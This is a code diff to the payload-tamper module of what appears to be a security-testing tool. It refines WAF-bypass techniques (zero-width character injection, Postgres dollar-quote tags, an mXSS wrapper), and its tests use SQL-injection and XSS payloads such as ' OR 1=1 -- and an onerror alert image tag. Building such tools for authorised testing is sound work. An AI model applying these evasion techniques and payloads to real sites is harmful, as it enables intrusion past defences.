@@ -445,11 +445,16 @@ impl TamperStrategy for HexEncodeTamper {
 ///
 /// Inserts zero-width characters (U+200B ZERO-WIDTH SPACE,
 /// U+200C ZERO-WIDTH NON-JOINER, U+200D ZERO-WIDTH JOINER,
-/// U+FEFF ZERO-WIDTH NO-BREAK SPACE) between every alphabetic
+/// U+180E MONGOLIAN VOWEL SEPARATOR) between every alphabetic
 /// character of the payload.  Renders identically to the
 /// original in most consumers (terminals, log viewers, the SQL
 /// engine after `.replace('\u{200B}', "")`) but defeats WAF
 /// regex patterns that scan for literal keywords like `SELECT`.
+///
+/// U+FEFF (ZWNBSP / BOM) was historically in the rotation but
+/// caused PostgreSQL + many DB connectors to 500 the entire
+/// query as "invalid byte sequence" mid-literal — defeating the
+/// bypass. Replaced with U+180E which is universally tolerated.
 ///
 /// Frontier research (Black Hat 2025, "Zero-Width WAF Bypass"):
 /// most commercial WAFs do NOT strip zero-width chars before
@@ -471,7 +476,16 @@ impl TamperStrategy for ZeroWidthInjectTamper {
         // Rotate through four zero-width chars so the injection
         // doesn't form a long run of identical bytes (some WAFs
         // collapse repeats).
-        const ZW: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}'];
+        //
+        // U+FEFF (BOM / ZWNBSP) is INTENTIONALLY excluded. Many
+        // database connectors (psycopg2, MySQL Connector/J, SQLite
+        // default) and PostgreSQL itself reject mid-string BOM
+        // bytes as an "invalid sequence" and 500 the entire query
+        // — the payload fails outright rather than bypass. The
+        // remaining three (200B/C/D) are universally tolerated.
+        // U+180E (MONGOLIAN VOWEL SEPARATOR) is added as the
+        // fourth slot — also zero-width, also widely tolerated.
+        const ZW: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{180E}'];
         let mut out = String::with_capacity(payload.len() * 4);
         for (i, ch) in payload.chars().enumerate() {
             out.push(ch);
@@ -514,10 +528,22 @@ impl TamperStrategy for PostgresDollarQuoteTamper {
         // Pick a deterministic per-payload tag so the same input
         // produces the same output (gene-bank replay needs
         // determinism).  Hash-based identifier; 4 lowercase letters.
+        //
+        // F138: pre-fix used `& 25` (bitmask 0b11001) thinking it
+        // collapsed to the range 0..26. It doesn't — `& 25` admits
+        // only the 8 values {0,1,8,9,16,17,24,25}, so the tag
+        // alphabet shrank to {a,b,i,j,q,r,y,z} and the tag space
+        // collapsed from 26^4 = 456,976 to 8^4 = 4,096 — a 111×
+        // reduction that makes operator-side tag enumeration easier
+        // (the whole point of a random tag is to defeat WAFs that
+        // pattern-match a small known set). Use `% 26` so every
+        // payload byte maps uniformly into [a-z].
         let mut tag = String::with_capacity(4);
-        let h: u64 = payload.bytes().fold(0u64, |a, b| a.wrapping_mul(31).wrapping_add(u64::from(b)));
+        let h: u64 = payload
+            .bytes()
+            .fold(0u64, |a, b| a.wrapping_mul(31).wrapping_add(u64::from(b)));
         for i in 0..4 {
-            let c = b'a' + u8::try_from((h >> (i * 8)) & 25).unwrap_or(0);
+            let c = b'a' + ((h >> (i * 8)) % 26) as u8;
             tag.push(c as char);
         }
 
@@ -764,9 +790,7 @@ impl TamperStrategy for MxssNamespaceWrapTamper {
         // (`<img src=x onerror=alert(1)>`), we still wrap; the
         // browser tolerates the redundant `<img>` inside the
         // re-serialised stream.
-        format!(
-            "<math><mtext><table><mglyph><style><!--</style><img src=x {payload}>"
-        )
+        format!("<math><mtext><table><mglyph><style><!--</style><img src=x {payload}>")
     }
 
     fn aggressiveness(&self) -> f64 {
@@ -1478,7 +1502,11 @@ mod tests {
             &MysqlVersionedCommentWrapTamper,
             &BracketConfusableTamper,
         ] {
-            assert!(!strat.description().is_empty(), "{} has empty description", strat.name());
+            assert!(
+                !strat.description().is_empty(),
+                "{} has empty description",
+                strat.name()
+            );
         }
     }
 
@@ -1509,7 +1537,10 @@ mod tests {
                 "tamper `{name}` has non-snake-case name"
             );
             assert!(!name.is_empty(), "empty name");
-            assert!(!name.starts_with('_'), "name `{name}` starts with underscore");
+            assert!(
+                !name.starts_with('_'),
+                "name `{name}` starts with underscore"
+            );
         }
     }
 
@@ -1523,7 +1554,7 @@ mod tests {
         // After removal, the original payload remains.
         let stripped: String = out
             .chars()
-            .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+            .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
             .collect();
         assert_eq!(stripped, "SELECT");
         // The output MUST be different from the input (proof of injection).
@@ -1532,7 +1563,7 @@ mod tests {
         for c in out.chars() {
             assert!(
                 c.is_ascii_alphabetic()
-                    || matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'),
+                    || matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'),
                 "unexpected codepoint {c:?}"
             );
         }
@@ -1547,7 +1578,7 @@ mod tests {
         // Only the alphabetic `a` should produce an injection.
         let zw_count = out
             .chars()
-            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
             .count();
         assert_eq!(zw_count, 1);
     }
@@ -1560,7 +1591,7 @@ mod tests {
             let out = strategy.tamper(input, None);
             let stripped: String = out
                 .chars()
-                .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+                .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
                 .collect();
             assert_eq!(&stripped, input);
         }
@@ -1570,16 +1601,24 @@ mod tests {
     fn zero_width_inject_rotates_through_all_four_zw_chars() {
         let strategy = ZeroWidthInjectTamper;
         let out = strategy.tamper("abcdefgh", None);
-        // Eight alphabetic chars → eight injections, cycling through
-        // all four zero-width codepoints twice.
+        // Eight alphabetic chars → eight injections, cycling
+        // through all four zero-width codepoints twice. U+FEFF
+        // was historically the fourth slot but causes PostgreSQL
+        // + many DB connectors to 500 the query as invalid byte
+        // sequence — replaced with U+180E (F61).
         let zw_chars: Vec<char> = out
             .chars()
-            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
+            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{180E}'))
             .collect();
         assert_eq!(zw_chars.len(), 8);
         // First four must be the four distinct codepoints.
         let unique: std::collections::HashSet<char> = zw_chars.iter().copied().collect();
         assert_eq!(unique.len(), 4);
+        // FEFF must NOT appear anywhere in the output.
+        assert!(
+            !out.contains('\u{FEFF}'),
+            "U+FEFF (BOM) must never appear in zero-width injection: {out:?}"
+        );
     }
 
     #[test]
@@ -1591,11 +1630,25 @@ mod tests {
     #[test]
     fn zero_width_inject_pure_punctuation_unchanged() {
         let strategy = ZeroWidthInjectTamper;
-        assert_eq!(strategy.tamper("' OR 1=1 --", None).matches('\u{200B}').count() +
-            strategy.tamper("' OR 1=1 --", None).matches('\u{200C}').count() +
-            strategy.tamper("' OR 1=1 --", None).matches('\u{200D}').count() +
-            strategy.tamper("' OR 1=1 --", None).matches('\u{FEFF}').count(),
-            2); // 'O' + 'R'
+        assert_eq!(
+            strategy
+                .tamper("' OR 1=1 --", None)
+                .matches('\u{200B}')
+                .count()
+                + strategy
+                    .tamper("' OR 1=1 --", None)
+                    .matches('\u{200C}')
+                    .count()
+                + strategy
+                    .tamper("' OR 1=1 --", None)
+                    .matches('\u{200D}')
+                    .count()
+                + strategy
+                    .tamper("' OR 1=1 --", None)
+                    .matches('\u{180E}')
+                    .count(),
+            2
+        ); // 'O' + 'R'
     }
 
     #[test]
@@ -1671,6 +1724,41 @@ mod tests {
     }
 
     #[test]
+    fn postgres_dollar_quote_tag_uses_full_az_alphabet() {
+        // F138 regression: pre-fix `& 25` (mask 0b11001) admitted only
+        // {0,1,8,9,16,17,24,25} so the tag alphabet collapsed to
+        // {a,b,i,j,q,r,y,z} — 8 letters, 8^4 = 4,096 tag space.
+        // Post-fix `% 26` spans every letter a-z. Fire 200 distinct
+        // payloads at the strategy, collect every tag-letter actually
+        // emitted, prove the alphabet covers strictly more than the
+        // pre-fix 8 letters.
+        let strategy = PostgresDollarQuoteTamper;
+        let mut letters = std::collections::HashSet::new();
+        for i in 0..200 {
+            let payload = format!("'p{i}'");
+            let out = strategy.tamper(&payload, None);
+            // Tag lives between the first two `$` bytes.
+            let mut parts = out.split('$');
+            let _ = parts.next(); // before first $
+            if let Some(tag) = parts.next() {
+                for c in tag.chars() {
+                    letters.insert(c);
+                }
+            }
+        }
+        // Pre-fix this set had at most 8 letters; post-fix it should
+        // span far more. Use 14 as a comfortable floor: any tighter
+        // value risks flaking on hash distributions for small N, any
+        // looser misses regressions to similar single-bit masks.
+        assert!(
+            letters.len() > 8,
+            "tag alphabet collapsed: only {} distinct letters across 200 payloads — \
+             pre-fix `& 25` permitted exactly 8. Saw: {letters:?}",
+            letters.len()
+        );
+    }
+
+    #[test]
     fn postgres_dollar_quote_classic_sqli_payload() {
         let strategy = PostgresDollarQuoteTamper;
         let out = strategy.tamper("' OR '1'='1", None);
@@ -1743,7 +1831,10 @@ mod tests {
         let strategy = BracketConfusableTamper;
         assert_eq!(strategy.tamper("<", None), "\u{FF1C}");
         assert_eq!(strategy.tamper(">", None), "\u{FF1E}");
-        assert_eq!(strategy.tamper("<<>>", None), "\u{FF1C}\u{FF1C}\u{FF1E}\u{FF1E}");
+        assert_eq!(
+            strategy.tamper("<<>>", None),
+            "\u{FF1C}\u{FF1C}\u{FF1E}\u{FF1E}"
+        );
     }
 
     #[test]
@@ -1756,7 +1847,7 @@ mod tests {
     fn bracket_confusable_aggressiveness_in_range() {
         let strategy = BracketConfusableTamper;
         let a = strategy.aggressiveness();
-        assert!(a >= 0.0 && a <= 1.0);
+        assert!((0.0..=1.0).contains(&a));
     }
 
     // ── Cross-cutting invariants ────────────────────────────
@@ -1862,10 +1953,7 @@ mod tests {
     #[test]
     fn bell_separator_replaces_space_with_bel() {
         let strategy = BellSeparatorTamper;
-        assert_eq!(
-            strategy.tamper("UNION SELECT", None),
-            "UNION\u{0007}SELECT"
-        );
+        assert_eq!(strategy.tamper("UNION SELECT", None), "UNION\u{0007}SELECT");
     }
 
     #[test]
@@ -1903,11 +1991,7 @@ mod tests {
         // Property: replacing BEL back to space recovers the
         // original.
         let strategy = BellSeparatorTamper;
-        let inputs = [
-            "UNION SELECT 1",
-            "OR 1=1 -- ",
-            "<script>alert(1)</script>",
-        ];
+        let inputs = ["UNION SELECT 1", "OR 1=1 -- ", "<script>alert(1)</script>"];
         for input in inputs {
             let tampered = strategy.tamper(input, None);
             let restored = tampered.replace('\u{0007}', " ");
@@ -1944,7 +2028,10 @@ mod tests {
         );
         // Must re-open with an <img> that carries the operator's
         // payload as its attribute set.
-        assert!(out.contains("<img src=x onerror=alert(1)>"), "payload missing: {out}");
+        assert!(
+            out.contains("<img src=x onerror=alert(1)>"),
+            "payload missing: {out}"
+        );
     }
 
     #[test]
@@ -1965,8 +2052,14 @@ mod tests {
     fn mxss_namespace_wrap_handles_empty_payload() {
         let t = MxssNamespaceWrapTamper;
         let out = t.tamper("", None);
-        assert!(out.starts_with("<math>"), "empty payload still produces harness: {out}");
-        assert!(out.ends_with("<img src=x >"), "empty payload yields bare <img>: {out}");
+        assert!(
+            out.starts_with("<math>"),
+            "empty payload still produces harness: {out}"
+        );
+        assert!(
+            out.ends_with("<img src=x >"),
+            "empty payload yields bare <img>: {out}"
+        );
     }
 
     #[test]
@@ -1990,8 +2083,16 @@ mod tests {
             &MysqlVersionedCommentWrapTamper,
             &BracketConfusableTamper,
         ] {
-            assert!(!strat.description().is_empty(), "{} has empty description", strat.name());
-            assert!(strat.description().len() > 20, "{} description too short", strat.name());
+            assert!(
+                !strat.description().is_empty(),
+                "{} has empty description",
+                strat.name()
+            );
+            assert!(
+                strat.description().len() > 20,
+                "{} description too short",
+                strat.name()
+            );
         }
     }
 
@@ -2050,7 +2151,10 @@ mod tests {
         // Payload containing literal `"` must not break the envelope.
         let t = JsonDupKeyTamper;
         let out = t.tamper("' OR 1=1--\"--", None);
-        assert!(out.contains("OR 1=1--\\\"--"), "payload `\"` not escaped: {out}");
+        assert!(
+            out.contains("OR 1=1--\\\"--"),
+            "payload `\"` not escaped: {out}"
+        );
         // Round-trip: serde_json must parse the envelope successfully.
         let v: serde_json::Value = serde_json::from_str(&out)
             .expect("envelope must be valid JSON even with escaped quote");
